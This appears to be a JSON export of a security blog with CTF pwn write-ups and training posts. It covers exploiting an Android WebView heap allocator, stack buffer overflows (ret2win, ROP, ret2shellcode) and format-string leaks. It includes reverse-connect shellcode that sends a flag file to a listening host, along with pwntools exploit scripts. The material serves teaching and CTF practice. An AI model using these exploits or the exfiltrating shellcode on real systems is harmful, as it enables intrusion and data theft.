
[{"content":"","date":"2024-02-01","externalUrl":null,"permalink":"/tags/android/","section":"Tags","summary":"","title":"Android","type":"tags"},{"content":"","date":"2024-02-01","externalUrl":null,"permalink":"/tags/bi0sctf/","section":"Tags","summary":"","title":"Bi0sctf","type":"tags"},{"content":"","date":"2024-02-01","externalUrl":null,"permalink":"/tags/reverse_shell/","section":"Tags","summary":"","title":"Reverse_Shell","type":"tags"},{"content":"","date":"2024-02-01","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":"I created an Android based pwn challenge that involes exploiting a dynamic memory allocator using the webview interface.\nThe challenge inclues the following sections:\nnative.c: Reverse engineering matrix operations performed. tallocator.c: Exploiting an arbitrary free to corrupt heap metadata. Reverse shellcode to execute an ORW. Challenge Points: 995 Solves: 4\nChallenge Author: # tourpran: Memory Allocator Exploitation, tallocator.c the.m3chanic: Reverse Engineering, native.c k0m1: General Android Dev Challenge Description: # Built our enhanced memory allocator, designed specifically for admins and prioritizing both speed and security. Experience the boost in performance firsthand with our website speed tester.\nChallenge File: # Primary Link Mirror Link General: # First time, creating an android X pwn challenge, it was pretty fun and straight forward to solve. This challenge was inspired from google CTF: TRIDROID. If you are new to this, I heavily recomend going through that first. We will go in this specific order to solve the challenge.\nDebugging with gdbserver Reversing the native.c Exploiting the tallocator.c Writing Reverse Shellcode Packing the Exploit Introduction: The App: # Lets start analyzing the application from AndroidManifest.xml by throwing our application into JADX. The application has a very simple working with just one activity MainActivity and also has Internet Permission. Looking into MainActivity.java\n@Override public void onCreate(Bundle bundle) { super.onCreate(bundle); setContentView(R.layout.activity_main); this.w = (WebView) findViewById(R.id.webView); this.b = new BroadcastReceiver() { @Override // android.content.BroadcastReceiver public void onReceive(Context context, Intent intent) { if (Objects.equals(intent.getAction(), MainActivity.INTENT1)) { MainActivity.this.w.loadUrl((String) Objects.requireNonNull(intent.getStringExtra(\u0026#34;url\u0026#34;))); } } }; IntentFilter intentFilter = new IntentFilter(); intentFilter.addAction(INTENT1); registerReceiver(this.b, intentFilter); this.w.getSettings().setJavaScriptEnabled(true); this.w.getSettings().setCacheMode(2); this.w.addJavascriptInterface(this, \u0026#34;bi0sctf\u0026#34;); this.w.setWebViewClient(new WebViewClient()); this.w.setWebChromeClient(new WebChromeClient()); this.w.loadUrl(\u0026#34;http://example.net\u0026#34;); } We Could see that this activity has a Webview loading example.net. We can load a custom url using the Dynamic Broadcast Receiver which takes an extra url. We could notice that a library named tallocator is being loaded and it provides 2 native functions - talloc and tree. public native long talloc(int i, byte[] bArr); public native int tree(long j); Along with that, this webview provides a JavascriptInterface, whose methods can be accessed via bi0sctf instance. @JavascriptInterface public long secure_talloc(String str, int i, byte[] bArr) { if (new a().check(str)) { return talloc(i, bArr); } return -1L; } @JavascriptInterface public int secure_tree(String str, long j) { if (new a().check(str)) { return tree(j); } return -1; } There are 2 functions that has @JavascriptInterface notation - secure_talloc and secure_tree, which internally accesses the native functions talloc and tree if we bypass the check method of class a. Looking at class a:\npublic class a { public native boolean check(String str); static { System.loadLibrary(\u0026#34;native\u0026#34;); } } It has just one method check that is being implemented in a JNI Library named native, Which will be covered in the upcoming sections. Debugging with gdberver: # Create the android image with the same specifications as given in the script.py (with AVDManager). subprocess.call( \u0026#34;avdmanager\u0026#34; + \u0026#34; create avd\u0026#34; + \u0026#34; --name \u0026#39;Pixel_4_XL\u0026#39;\u0026#34; + \u0026#34; --abi \u0026#39;default/x86_64\u0026#39;\u0026#34; + \u0026#34; --package \u0026#39;system-images;android-30;default;x86_64\u0026#39;\u0026#34; + \u0026#34; --device pixel_4_xl\u0026#34; + \u0026#34; --force\u0026#34; + \u0026#34; \u0026gt; /dev/null 2\u0026gt; /dev/null\u0026#34;, env=ENV,close_fds=True,shell=True) Install the apk into the emulator and run the app. Meanwhile in adb get the pid of the app and attach gdbserver to that pid with port forwarding enabled. In our machine we just connect gdb to that port using: $ adb forward tcp:7777 tcp:port $ gdb $ target remote 127.0.0.1:port More information on how to work with gdbserver and inpecting memory is given here. Reversing the native.c: # The working of the.m3chanic\u0026rsquo;s part of the challenge is pretty straightforward.\nLet us start by looking at where our input is involved in this\nFirst, a floating point array of 4x4 is being initialised, and being passed to a function v4 void func_1(float a1[4][4]) { for (int i = 0; i \u0026lt; 4; i++) { for (int j = 0; j \u0026lt; 4; j++) { char c; scanf(\u0026#34;%c\u0026#34;, \u0026amp;c); a1[i][j] = (float)c; } } } This function is simple, it\u0026rsquo;s just taking 16 characters as input and storing them as a 2d floating point matrix Next up it\u0026rsquo;s initialising another 4x4 floating point array, and passing it to another function func_7 is as follows\nvoid func_7(float a1[x][x], float a2[x][x]) { int i, j; for (i = 0; i \u0026lt; x; i++) { for (j = 0; j \u0026lt; x; j++) { a2[i][j] = a1[i][j]; } } } This function is just copying the matrix to a2, so now v2 contains our input Next,\nfloat func_2(int a1, int a2, float a3[a1][a2]) { if (a1 != a2) { return 0; } float v1 = 0; if (a1 == 1) { v1 = a3[0][0]; } else { for (int i = 0; i \u0026lt; a1; i++) { float v2[a1 - 1][a2 - 1]; for (int j = 1; j \u0026lt; a1; j++) { for (int k = 0; k \u0026lt; i; k++) { v2[j - 1][k] = a3[j][k]; } for (int k = i + 1; k \u0026lt; a2; k++) { v2[j - 1][k - 1] = a3[j][k]; } } int v3 = (i % 2 == 0) ? 1 : -1; v1 += v3 * a3[0][i] * func_2(a1 - 1, a2 - 1, v2); } } return v1; } This function is called with arguments (4, 4, input_arr) It is declaring another floating point array v2 (local to this function), of 1 square dimension lesser than our input matrix Let\u0026rsquo;s break down this for loop:\nfor (int j = 1; j \u0026lt; a1; j++) { for (int k = 0; k \u0026lt; i; k++) { v2[j - 1][k] = a3[j][k]; } for (int k = i + 1; k \u0026lt; a2; k++) { v2[j - 1][k - 1] = a3[j][k]; } } Currently, we know that v2 forms some kind of submatrix of the original matrix that we pass in, and that checks out seeing how it is being populated inside this for loop A float v1 is being initialised to 0 as well. int v3 = (i % 2 == 0) ? 1 : -1; v1 += v3 * a3[0][i] * func_2(a1 - 1, a2 - 1, v2); Then, based on the index value of i (as in, whether or not it is divisible by 2), it is set to either 1 or -1 And it is multiplied with the current column value of a3 and then multiplied with the return value of func_2 but with a smaller sub-matrix If you see through this abstraction a little bit, and try and look at it as an implementation of something already existing, you will quickly realised that func_2 is just calculating the determinant of whatever matrix you pass to it (Some things that give this away are the fact that submatrix is passed on recursively, and -1 is multiplied with the final return value based on the current index, which is the case for determinant also)\nNext up, a new 4x4 matrix is being initialised and being passed to a function along with our input matrix\nvoid func_3(int a1, float a2[a1][a1], float a3[a1][a1]) { float v1[a1 - 1][a1 - 1]; for (int i = 0; i \u0026lt; a1; i++) { for (int j = 0; j \u0026lt; a1; j++) { int sub_i = 0, sub_j = 0; for (int v2 = 0; v2 \u0026lt; a1; v2++) { if (v2 == i) continue; for (int v3 = 0; v3 \u0026lt; a1; v3++) { if (v3 == j) continue; v1[sub_i][sub_j] = a2[v2][v3]; sub_j++; } sub_i++; sub_j = 0; } int v4 = (i + j) % 2 == 0 ? 1 : -1; a3[i][j] = v4 * func_2(a1 - 1, a1 - 1, v1); } } } Similar to the previous function, another submatrix is being initialised inside the function and is being populated - again, based on the indices This one seems straightforward now that we\u0026rsquo;ve understood the previous function It is simply calculating the minor matrix of the matrix passed as argument to it, and is finding the determinant of that matrix. This is the same as finding the cofactor of the given matrix (again, looking at it literally might not make sense at first, but once you try and think of it as an implementation of something else, the dots will start connecting).\nNext function\nvoid func_4(int a1, int a2, float a3[a1][a2], float a4[a2][a1]) { for (int i = 0; i \u0026lt; a1; i++) { for (int j = 0; j \u0026lt; a2; j++) { a4[j][i] = a3[i][j]; } } } This one is simple, it just transposes the matrix you give it as input Now, I think you can start seeing the full picture as well\nFirst, we found the determinant of the matrix, next we found the cofactor matrix and transposed it (Keep in mind, transpose of the cofactor matrix is the same as finding the adjoint of a given matrix)\nNext up, it\u0026rsquo;s taking the adjoint of the matrix we input, and dividing it with the determinant we found of it earlier\nvoid inverse_matrix(int N, float matrix[N][N], float inverse[N][N], int det, float cofactor[N][N]) { for (int i = 0; i \u0026lt; N; i++) { for (int j = 0; j \u0026lt; N; j++) { inverse[i][j] = (float) (cofactor[j][i] / det); } } } This is the same formula as finding the inverse of a given matrix ;)\nAnd finally, the inverse of our matrix is being compared with a precalculated inverse By property, (A⁻¹)⁻¹ == A itself, so all we need to do is find the inverse of the precalculated matrix\nFinding that, and rounding off the numbers appropriately and converting them to their ascii characters will give us this as the valid input: 50133tbd5mrt1769 And now we can proceed to the rest of the challenge! :)\nExploiting the tallocator.c: # It is pretty straight forward to reverse engineer the talloc/tree functions that act similar to the malloc/free. So, I will be using my source code to explain things more clearly. Lets start off with a quick code run through\u0026hellip;\nEssentials: # int init_talloc(){ if(init_called == true){ return 0; } runDebug = mmap((void*)0x41410000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0); init_called = true; HeapStart = sbrk(0x1000); PUT(HeapStart+8, 0x30); PUT(HeapStart+0x38, (0x1000 - 0x38)); PUT(HeapStart+0x20, 0x3a63); top_chunk = HeapStart + 0x38; } In init_talloc, we can see that the runDebug is set to a mmapped region with RWX permisions, which has an addres of 0x41410000. Rest, initializes the Heapstart and topchunk to their appropriate values after an sbrk syscall. talloc: # Debugger_talloc = *(long long *)(HeapStart+40); if(Debugger_talloc != 0){ void (*call_debugger)() = (void (*)())Debugger_talloc; call_debugger(); perror(\u0026#34;Debugger called !!\u0026#34;); } Quickly checks if the Debugger_talloc is set to NULL, otherwise it jumps to whatever it is pointing to. if(alloc_size \u0026lt;= 0x150 \u0026amp;\u0026amp; (ull *)HEAD_SHORT != 0){ void* curr_ptr = (void *)HEAD_SHORT; int cnt = 0; while(curr_ptr != NULL \u0026amp;\u0026amp; cnt != 20){ if(GETSIZE(curr_ptr) \u0026gt;= alloc_size \u0026amp;\u0026amp; abs(alloc_size-GETSIZE(curr_ptr)) \u0026lt; best_size){ best_size = abs(alloc_size - GETSIZE(curr_ptr)); ptr = (ull*)curr_ptr; } curr_ptr = (ull *)*(ull *)(curr_ptr); cnt += 1; } if(ptr != 0 \u0026amp;\u0026amp; GET_FWD(ptr) != 0){ SET_BKD(GET_FWD(ptr), GET_BKD(ptr)); } if(ptr != 0 \u0026amp;\u0026amp; GET_BKD(ptr) != 0){ SET_FWD(GET_BKD(ptr), GET_FWD(ptr)); } if((ull)ptr == HEAD_SHORT){ PUT(\u0026amp;HEAD_SHORT, GET(ptr)); } } Pretty Simple, straight forward use of getting a free chunk. Get the HEAD_SHORT from the top of the created heap, iterate through the entire linked_list and keep storing your best fit size and a pointer to that chunk. Finally unlink that particular chunk from the linked list. The same process is done if the request for the chunk was above the range 0x150, instead updating from the HEAD_LONG. If no chunk is present in the linked list, it just takes space from the top_chunk. note: HEAD_LONG and HEAD_SHORT are both stored on top of our entire heap. tree: # if(chunk_size \u0026lt;= 0x100){ if(HEAD_SHORT == 0){ SET_FWD(ptr, 0); SET_BKD(ptr, \u0026amp;HEAD_SHORT); HEAD_SHORT = (ull)ptr; return 0; } SET_FWD(ptr, HEAD_SHORT); SET_BKD(ptr, \u0026amp;HEAD_SHORT); SET_BKD(HEAD_SHORT, ptr); HEAD_SHORT = (ull)ptr; } Essentially, adds it back to the linked list, pointed by HEAD_SHORT and HEAD_LONG. other: # #define SET_USE(p) *(ull *)(p-8) = (*(ull *)(p-8)) | 0b1 #define SET_FREE(p) *(ull *)(p-8) = (*(ull *)(p-8)) \u0026amp; ~(0b1UL) Every chunk is 16 bytes aligned, hence I made it so that the last bit in the size_field as either: 1: currently in use 0: free to use Helper Functions: # function p64(data){ const byteArray = new Uint8Array([0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]) let i=0 while(data \u0026gt; 0){ byteArray[i] = data\u0026amp;0xff data = (data - data%256) / 256 i = i+1 } return String.fromCharCode.apply(String, byteArray) } function fin(data){ const byte_array = [] for (const character of data) { const code = character.charCodeAt(0) byte_array.push(code) } return byte_array } function u64(data){ return parseInt(data.match(/../g).reverse().join(\u0026#39;\u0026#39;), 16) } Helps converting the 8 byte data stream in little endian to write specific address into memory. Bug: # We are able to free arbitrary pointers eventough it has some basic restrictions. Hence, Forging a fake chunk and using that to access the free list pointers on top of the heap. Manipulating the free_list pointers will get us to arbitrary write and hence writing out shellcode into the RWX region. This was the main aim of the challenge. Writing Reverse Shellcode: # Create a socket. Establish a connection to the ip, port that you have a listening port open on. Finally do Open, Read, Write, to the opened socket to print out the flag. global _start section .text _start: socket: push 0x29 pop rax push 0x02 pop rdi push 0x01 pop rsi xor edx, edx syscall mov r9, rax connect: push 0x2a pop rax mov rdi, r9 ; creating sockaddr data structure push rdx\t; pushing padding push rdx push 0xdeadbeef ; pushing INADDR_ANY push word 0x3905\t; pushing PORT: 1337 push word 0x0002\t; pushing AF_INET mov rsi, rsp add rdx, 0x10 syscall open: mov rax, 2 mov r8, 0x0000000000000067 push r8 mov r8, 0x616c662f65676e65 push r8 mov r8, 0x6c6c6168632e6469 push r8 mov r8, 0x6f72646e612e6674 push r8 mov r8, 0x63733069622f6174 push r8 mov r8, 0x61642f617461642f push r8 mov rdi, rsp mov rsi, 0 mov rdx, 0 syscall read: mov rdi, rax mov rax, 0 mov rsi, rsp mov rdx, 0x50 syscall write: mov rax, 0x1 mov rdi, r9 mov rsi, rsp mov rdx, 0x50 syscall finish: push 0x3c pop rax syscall path: db \u0026#34;/data/data/bi0sctf.android.challenge/flag\u0026#34;, 0 Exploit Script with comments: # Receiveing the Flag on the listening port:\nQuick Mind Map:\nThe Final exploit to exploit can be found here Closing Note: # Congrats to The Flat Network Society for first blooding the challenge. Hope you guys had fun solving the challenge!\n","date":"2024-02-01","externalUrl":null,"permalink":"/writeups/1728230875066-tallocator-bi0sctf/","section":"Writeups","summary":"\u003cp\u003eI created an Android based pwn challenge that involes exploiting a dynamic memory allocator using the webview interface.\u003c/p\u003e","title":"Tallocator [bi0sCTF 2024]","type":"writeups"},{"content":"","date":"2024-02-01","externalUrl":null,"permalink":"/","section":"tourpran","summary":"","title":"tourpran","type":"page"},{"content":" Various writeups from different CTFs I play, This mainly contains pwn challenges. For more challenges you can skim through my ctfs archive or go through some structured content stack, heap, browser. ","date":"2024-02-01","externalUrl":null,"permalink":"/writeups/","section":"Writeups","summary":"Various writeups from different CTFs I play, This mainly contains pwn challenges.","title":"Writeups","type":"writeups"},{"content":"","date":"2024-01-18","externalUrl":null,"permalink":"/tags/pwn/","section":"Tags","summary":"","title":"Pwn","type":"tags"},{"content":" Try solving these challenge on your own, and use this guide only when needed. If you want more challenges you can search in (pwn-hub) basic attacks ","date":"2024-01-18","externalUrl":null,"permalink":"/training/","section":"Pwn Training","summary":"Try solving these challenge on your own, and use this guide only when needed.","title":"Pwn Training","type":"training"},{"content":"","date":"2024-01-18","externalUrl":null,"permalink":"/tags/youtube/","section":"Tags","summary":"","title":"Youtube","type":"tags"},{"content":"These are beginner friendly videos to get you started into the field of Binary Exploitation.\nIntroduction to Assembly Programming - 00 # Reverse engineering Binaries - 01 # Our First Exploit - 02 | pwntools | ret2win # Bruteforcing the Canary - 03 | Partial Overwrite and ret2win # Global Offset Table and Procedure Linkage Table - 04 # Maybe, In the future I might upload more if it feels right! For now, jaa ne.\n","date":"2024-01-18","externalUrl":null,"permalink":"/training/1728392069994-youtube---stack-basics/","section":"Pwn Training","summary":"\u003cp\u003eThese are beginner friendly videos to get you started into the field of Binary Exploitation.\u003c/p\u003e","title":"Youtube - Stack Basics","type":"training"},{"content":"","date":"2024-01-07","externalUrl":null,"permalink":"/series/pwn-training/","section":"Series","summary":"","title":"Pwn Training","type":"series"},{"content":"This is an initiative taken by team members of ARESx. In this series of pwn-training we will be looking into various types of attacks performed on binaries. This in the first part of the series. We will go in a slow paced fashion covering most of the small details, so anyone can follow along this wonderful course.\nBinary Exploitation: # Any file that does some function/ work is called a binary. Breaking down the word, binary exploitation itself, gives the meaning. We try different ways to break/exploit a program(Binary). This has become a common category in games called CTFs.\nChallenge: # Here we are given a binary and the source code as part of the challenge. Usually the programmer writes in high level languages (human understandable language). Then that is compiled into a machine understandable form - binary. Our job as a exploit dev, need to figure out what this binary does and find the bug to exploit this program.\nvuln binary and vuln c code\nPlay around with both the files a bit and continue reading this blog.\nPrerequisites: # General understanding of linux. Curiosity to learn more by googling. (This is a must) Solution: # General Procedure: # Before stepping in further into the solution, a common set of procedure when followed will make your job easier. Usually when you get a binary,\nCheck the mitigations (check for all permissions, security restrictions) of the binary. Run the binary and get a feel of what it is doing. Try to debug the assembly code of main in a disassembler or debugger. (IDA/ GDB/ Hopper). Note down observations and proceed to write the exploit script. Concept of buffer overflow: # When we can write more than what we are supposed to write into a memory we call it a buffer overflow. Buffer overflows are common bugs when getting started in pwn. Gets is a vulnerable function that has a buffer overflow bug in it. It reads in more data than what the original array/ variable can handle. Multiple attacks will be discussed further on.\nStack # A Stack is a memory segment, ment for storing data when a program is excecuted. This is a temporary storage unit. All the local variables created are stored here.\nRegisters: # Registers are small data holding units. Think of it as variables used by the processor. Each register has its own unique job. source:wikipedia\nMitigations: # Before going into the exploitation, its better to check what mitigations are enabled for a binary. Mitigations are protections that were included to avoid certain attacks. We use the command checksec to see the basic mitigations in a binary.\nchecksec --file ./ret2shellcode If you don\u0026rsquo;t have checksec installed then, open up a terminal and type the below command to install the checksec program.\nsudo apt install checksec CANARY:\nIts a set of characters stored on the stack to make sure no buffer overflows takes place. No eXecute:\nNX Enabled - This makes sure that the code on the stack is not excecuted. NX Disabled - Yea you guessed it, the code on the stack can be excecuted. PIE:\nPosition Independent Excecutable: This mitigation will randomise the address of the code and PLT in the virtual memory each time the program gets excecuted. RWX:\nRead, write and execute : It\u0026rsquo;ll tell us if the binary has segments(parts) that we can read, write and excecute. Code walkthrough: # If you are a curious assembly code lover, make sure to head over to the gdb (GNU debugger) and dig deep. Here I\u0026rsquo;ll go through the c code since its a basic writeup. In most scenarios you are not given the source code as it makes the task much easier. try to get comfy with assembly. Or just use a disassembler lmao.\nJust ignore the ignore_me() function its for standard buffering and stuff. There are 2 functions called win and main.\nmain: # Looking at main function, we see there is a buf variable with size 0x60 and a puts call. There is also a printf that will leak the address of the buf variable. %p is the address pointing to something, with little bit of searching you will know, its the address of buf variable.\nThere is another function called gets(). We know its a dangerous function. lets see why.\nman gets Seems like gets will take input as long as there is a newline character which means we can get past the buf variable and mess things in the stack.\nGDB is a debugger that will break down the program into its assembly code. It makes things easier for a reverse engineer to know what a program does. I have a different version/flavour of gdb called pwndbg. link to download\ndisass main Ok, This is the main function that we saw earlier. Here a stack frame is created with the command push rbp; mov rbp,rsp . In a stack for every new function a new stack frame is created to store the local variables required in that particular function. So when a function exits the stack frame also gets deleted. le memory efficiency.\nPoint to note, The arguments to the function are passed via registers. RDI, RSI, RDX registers are used to store the first, second, third argument to a function.\nHere we see that the 3 arguments are set in the respective registers. Puts function is called with what is in the RDI register. We can also see a printf function which is called with RDI set to RIP+0xe29, which is the start of our buffer. Here RIP refers to the instruction pointer. Finally a gets is also called, which is exploited in our case. Now, we will set a break point in GDB to stop at a particular location that we specify during the runtime. By doing this, at a specific instruction we can know what the registers are holding and what changes are made at that point of time in the excecution.\nTo set a breakpoint b * address of the instruction, in this case set a break point at ret instruction in main.\nb* 0x0000000000401238 Take some time of your own, play around with the binary and see if you can crash the binary in some way.\nGreat if you got a segfault else no worries. Well do it together. Run the binary in gdb with r and then give 0x60 \u0026ldquo;a\u0026quot;s, this will fill up the buf variable with all that garbage. After those random \u0026ldquo;a\u0026quot;s maybe create an offset pattern like 111111112222222233333333. So incase the binary crashes we can see exactly where it crashed.\nSegfault - It is caused because our program is trying to read a part of memory thats invalid\nIn our case we overflowed the buf variable with \u0026ldquo;a\u0026quot;s and filling the RBP with 11111111 and finally making the return address point to 22222222, Since there is no 22222222 address in memory, we will get a segfault. Whenever a program tries to jump to an address that is not there you will recieve a segfault error.\nYou can see all the values set in the registers like RAX, RBX, RCX. To our intrest we need the RSP. The RSP is the stack pointer or the register that holds infomartion about the next location to excecute. But do you see something fishy there ? Exactly we can control the return address of main. This means that we can make the binary excecute what we want.\nAim: # As an attacker our aim is to make this binary give a shell for us in the server. A shell is a way of getting complete access on whatever target we are attacking. In future blogs, you might also see that you wont have the root (admin) access in a shell. You have to do several privilage escalations to make yourself root, though all of those fun stuff are for another time.\nSo we looked at a win() function earlier, this will land us a nice neat shell! Though there wont be any win() function in real life applications, its your task to somehow find ways to get a shell in the server.\nReturn to win: # Now since we control the return address of main function, why not lets change the return address to win function?\nWin function does execve(\u0026quot;/bin/sh\u0026rdquo;) -\u0026gt; which means that it\u0026rsquo;ll call a system function called execve and excecute the command /bin/sh which is a shell. ok lets start writing our script in python. First we will import pwntools library to make things easier. Next we will connect to our binary and send/recieve messages.\nfrom pwn import * # Importing the library called pwntools p = process(\u0026#34;ret2shellcode\u0026#34;) # create a instance/process with the binary. helps to interact with the program. p.sendline(b\u0026#34;a\u0026#34;*0x60 + b\u0026#34;a\u0026#34;*8 + p64(0x00000000004011a5)) # Send the payload(attack input) to the program. p.interactive() #If we get a shell make it interactive. Here in the sendline command I am giving \u0026ldquo;a\u0026rdquo; * 0x60 to fill the buf variable and extra \u0026ldquo;a\u0026rdquo; * 8 to fill the rbp (base pointer) and then the address of win function. wait what is that p64() ?\np64() function will make your address into little endian format. To know more about formats\nRun this script and lets see what we get. SHOOT you get something called EOF (End Of File) ?\nYou can attach a gdb with your script and see where your script will crash / how it runs. But we are already given the c code and we know that there was some additional checks done to the execve.\nSo we have to somehow make the arg1 = 0xdeadbeef and arg2 = 0xcafebabe. This is where return oriented programming comes into picture.\nReturn Oriented Programming: # This is a type of attack where we use static code or code thats been used to make this binary. we will combine one or many such code snippets to form a chain that\u0026rsquo;ll do something valuable to us.\nSince win is a function with arg1 and arg2 as parameters. We can set RDI = 0xdeadbeef and RSI = 0xcafebabe. Then call win function. Exploit [ret2win]: # Firstly we can get all the gadgets/code snippets in the binary with ROPgadget. Then lets take out the ones that we want.\npython3 ROPgadget.py --binary ../Documents/pwn-train/pwn1/ret2shellcode We can pop the registers to put the values we want and since every gadget has a return attached to it, we can call win function after those gadgets.\nfrom pwn import * p = process(\u0026#34;ret2shellcode\u0026#34;) pause() p.sendline(b\u0026#34;a\u0026#34;*0x60 + b\u0026#34;a\u0026#34;*8 + p64(0x000000000040129b) + p64(0xdeadbeef) + p64(0x0000000000401299) + p64(0xcafebabe) + p64(0) + p64(0x00000000004011a5)) p.interactive() Exploit [simpler version]: # I know you went through all the struggle to set the arguments right, but if you can control the return address and jump literally anywhere, then why not just jump directly on the execve function.\nfrom pwn import * p = process(\u0026#34;ret2shellcode\u0026#34;) p.sendline(b\u0026#34;a\u0026#34;*0x60 + b\u0026#34;a\u0026#34;*8 + p64(0x00000000004011d1)) # address to execve p.interactive() Here we avoided the constraints and directly jumped to the execve funtion. Clever of you.\nreturn 2 shellcode: # This is the third and final way that we will discuss in this blog. Do you remember the leak at the begining ? Yes we will use the leak to get a shell. This time ignore the win() function. Without the help of helper function get a shell yourself :D .\nRemember at the begining I said this binary is NX disabled. So we can basically store the commands that we want to excecute in buf variable and then jump back to the buf variable thereby excecuting whatever we want.\nA shellcode is a set of instruction that will give you a shell or does some function that you want when excecuted.\nFirst step is to store the leak in a variable. We will use recvline function here to recv the output given by the program. Write all the commands that you want to excecute to get a shell (pwntools has inbuilt functionalities :D ). Fill the gap between the return and the shellcode with dummy instructions called nop. Jump back to buf variable. #!/usr/bin/env python3 from pwn import * def start(): global p if args.REMOTE: p = remote(\u0026#39;localhost\u0026#39;, 1337) else: p = elf.process() # start the process. context.binary = elf = ELF(\u0026#39;./ret2shellcode\u0026#39;) start() buf_addr = int(p.recvlines(2)[-1].split()[-1], 16) # recvlines and then get the leak payload = asm(shellcraft.linux.sh()) # generates a shellcode compatible with linux systems payload += b\u0026#39;\\x90\u0026#39;*(104 - len(payload)) # spans the gap between buf variable and return payload += p64(buf_addr) # address of the buf variable p.sendline(payload) # send the payload p.interactive() # doesnt close the shell and keeps it open for us. p.close() Hope you liked the pwn training 1. More training writeups coming soon ! :D\n","date":"2024-01-07","externalUrl":null,"permalink":"/training/1728228874517-return-to-shellcode-train-1/","section":"Pwn Training","summary":"This is an initiative taken by team members of ARESx.","title":"Return to Shellcode [train 1]","type":"training"},{"content":"","date":"2024-01-07","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"},{"content":"","date":"2024-01-07","externalUrl":null,"permalink":"/tags/training/","section":"Tags","summary":"","title":"Training","type":"tags"},{"content":"This is the 2nd challenge in the in the series. In this training we will go through the format string exploitation technique. We are provided 2 challenges of the same vulnerability. Lets go through them one by one.\nChallenge 1: # You can download the binary and the source down below.\nvuln binary and vuln c code\nSolution: # Mitigations: # Lets do the usual drill of checking the mitigations of this binary.\nchecksec --file ./flagleak RELRO:\nPartial RELRO - In the attackers point of view, the GOT (Global Offset Table) is readable and writeable. CANARY:\nThere is no canary so we can do a buffer overflow. No eXecute:\nNX Enabled - this makes sure that the code on the stack is not excecuted. PIE:\nNo PIE: We know the address of the binary at runtime, Since the binary is not position independent. Code walkthrough: # As said in previous training you can dig in deep into the assembly but to make things simpler we are given the source code. (in most CTF / Real life applications it\u0026rsquo;ll be helpful if you know assembly).\nIn the main function there is an obvious buffer overflow. Since there is a buffer of size 0x60 but the input is reading 0x60+8+16 (lmao author made is quite obvious). Ok we know the basic buffer overflow pattern right?\nI hope you can come to the print_flag function by your own. (If you could\u0026rsquo;nt, no probs go here ). Let us now see what is there in the print_flag function.\nIt is reading a file called flag.txt. If you dont have the file in your current directory it will give you an error. so create a file with a random value. In this task our main goal is to get the value of the flag. A flag is basically a valuable object in games called ctfs likewise in security contests these flags give you points. Wait does it mean you can\u0026rsquo;t get a shell in this challenge :( ? Umm\u0026hellip; You can spawn a shell in this challenge, but in this module we will only try out format string exploitation. If you are too keen to know, then check out what libc leak is. Dont worry we will see them in the later parts of this training.\nVulnerability: # Before going into the vuln lets see how printf works.\nprintf: # printf is a function in the glibc library. It basically has 2 parts, a format and an argument.\nprintf(\u0026#34;text here and %x %p %s \u0026#34;, a,b,c) So in the first field we fill it with text and format specifiers to print the values in the corresponding second field (variables). The different format specifiers like %x %p %s denote the datatype of the variable; like hex, pointer, string respectively.\nExploitation: # So what if we are able to control the first field. Imagine being able to read more values from 2nd field, more than the available arguments ? Will the program crash ? will it send some garbage data ? :thinking:\npoints to note:\nThe arguments are stored in the stack. printf will take values from the stack. So, the extra format specifiers we specified will continue to take the values stored in the stack. Lets do it live. [I am using pwntools template. to make a template go to terminal and type pwn template \u0026gt; xpl.py ]. Now go to vim and continue writing your exploit from the buffer overflow to the print_flag function. (if you are lazy you can copy the script down below :( )\n#!/usr/bin/env python3 from pwn import * # Set up pwntools for the correct architecture context.update(arch=\u0026#39;amd64\u0026#39;) exe = \u0026#39;./flagleak\u0026#39; elf = ELF(\u0026#34;flagleak\u0026#34;) def start(argv=[], *a, **kw): \u0026#39;\u0026#39;\u0026#39;Start the exploit against the target.\u0026#39;\u0026#39;\u0026#39; if args.GDB: return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw) else: return process([exe] + argv, *a, **kw) gdbscript = \u0026#39;\u0026#39;\u0026#39; b* main continue \u0026#39;\u0026#39;\u0026#39;.format(**locals()) #=========================================================== # EXPLOIT GOES HERE #=========================================================== p = start() #make a connection to the flagleak binary p.recvline() # recv the line given by the binary p.send(b\u0026#34;A\u0026#34;*(0x60+8) + p64(0x401016) + p64(elf.sym[\u0026#39;print_flag\u0026#39;]) ) # send a bufferoverflow to the binary to redirect code excecution to print_flag p.interactive() If you note there, I have added a ret instruction inbetween the print_flag function and rbp. This is to ensure stack alignment issues dont happen.\nOk now set a break point right at the printf function in the print_flag function. To do that change the main to the address of printf in the gdbscript. Running your script in vim is very easy.\nESC, :w | !./% GDB NOASLR In the above command we are writing the script with w, running a bash command with ! and excecuting the file ./%. % -\u0026gt; represents the current file. GDB NOASLR -\u0026gt; attachs gdb with ASLR disabled.\np = start() p.recvline() p.send(b\u0026#34;A\u0026#34;*(0x60+8) + p64(0x401016) + p64(elf.sym[\u0026#39;print_flag\u0026#39;]) ) p.recvline() p.sendline(\u0026#34;%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-\u0026#34;) p.interactive() After playing a little bit with gdb and format strings you will know that most of the stuff thats leaked is from the stack. Now you can also inspect the stack in gdb pwndbg with stack 20. Wait a minute!! Do you see there is an address in stack that contains all the contents of our flag file ? Yes when you read and store a file, its contents will be stored on the stack.\nAlso in the leaked values we can see that our flag address is also leaked.\nNow if you came this far you might have come across the format specifier %s -\u0026gt; this will get the contents stored in an address. So what if instead of printing the address, lets print the string pointed by the address. (So should we change all the p to s ?). hmm You do it only if all the values on the stack are valid address that points to some string. In this case its better to just count which offset our string is and then print it.\nCounting the offset we see that our string is in 12th position. So we can just print that position with a trick. %{offset}$p will print the the value in stack at that offset. So lets try it.\nYAY we managed to print it out, now finally we just have to print the contents of the address so change the p to s now. We managed to print something on the stack. (well done)\nChallenge 2: # Lets take this one step further and make the an exploit for another harder* binary.\nvuln binary and vuln c code\nMitigations: # Exactly the same mitigations except PIE. PIE ENABLED: this time we cant jump directly to another piece of code. The base address of binary will be randomised. Go ahead and give this a try.\nCode walkthrough: # In the main function we can see that a buffer variable shot is initialised and it is being used to get an input and later printed on to the screen. After that a gets function is used. We already know that gets function does not care about the size of the buffer, it will read until a newline. lets spam so %p in 